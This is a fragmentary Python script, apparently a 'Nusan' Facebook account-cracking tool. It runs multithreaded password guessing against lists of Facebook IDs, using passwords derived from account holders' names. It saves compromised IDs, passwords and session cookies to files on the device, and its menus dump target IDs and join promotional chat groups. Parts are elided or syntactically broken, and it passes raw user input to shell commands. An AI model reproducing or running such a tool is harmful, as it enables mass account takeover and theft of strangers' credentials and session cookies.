...
from concurrent.futures import ThreadPoolExecutor as NusanNusan
from string import * 
...
sys.stdout.write('\x1b]2; Nusan\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
b.             8 8 8888      88    d888888o.           .8.          b.             8 
888o.          8 8 8888      88  .`8888:' `88.        .888.         888o.          8 
Y88888o.       8 8 8888      88  8.`8888.   Y8       :88888.        Y88888o.       8 
.`Y888888o.    8 8 8888      88  `8.`8888.          . `88888.       .`Y888888o.    8 
8o. `Y888888o. 8 8 8888      88   `8.`8888.        .8. `88888.      8o. `Y888888o. 8 
8`Y8o. `Y88888o8 8 8888      88    `8.`8888.      .8`8. `88888.     8`Y8o. `Y88888o8 
8   `Y8o. `Y8888 8 8888      88     `8.`8888.    .8' `8. `88888.    8   `Y8o. `Y8888 
8      `Y8o. `Y8 ` 8888     ,8P 8b   `8.`8888.  .8'   `8. `88888.   8      `Y8o. `Y8 
8         `Y8o.`   8888   ,d8P  `8b.  ;8.`8888 .888888888. `88888.  8         `Y8o.` 
8            `Yo    `Y88888P'    `Y8888P ,88P'.8'       `8. `88888. 8            `Yo 

\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Nusan+nishi
\033[1;37m Facebook:           Nusan+Nishi
\033[1;37m Github  :            loading°°°°°°•••
\033[1;37m Version :            00.1
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Nusan Menu ")
        exit()
...
def Nusan():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/HEDae3FLwDc6hrTvqJffNc')
        pass
    elif select =='F':
        os.system('xdg-open https://https://www.facebook.com/profile.php?id=100094485904162&mibextid=ZbWKwL)
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        Nusan(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Nusan] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Nusanb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Nusanb};{ckkk}"
                    print(f"\r{R} [Nusan-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Nusan_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Nusan_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Nusan-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Nusan_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Nusan] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Nusan-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Nusan_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Nusan_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Nusan-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Nusan] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Nusan] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Nusan-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Nusan_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with NusanNusan(max_workers=30) as Nusanworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                Nusanworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Nusanworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Nusanworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Nusanworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Nusan.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/Nusan.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    Nusan = input('Put File Name :')
    print(" ")
    Nusan = input('Saving Put File Name :')
    os.system('touch ' +Nusan)
    os.system('sort -r '+Nusan+' | uniq > '+Nusan)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Nusan )
    print(47*'-')
    print("File Saved To :" + Nusan )
    print(47*'-')
    input(f"{S} Press Enter To Back Nusan Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/Nusan.txt\n') 
        filepath = input("Put File Name: ")
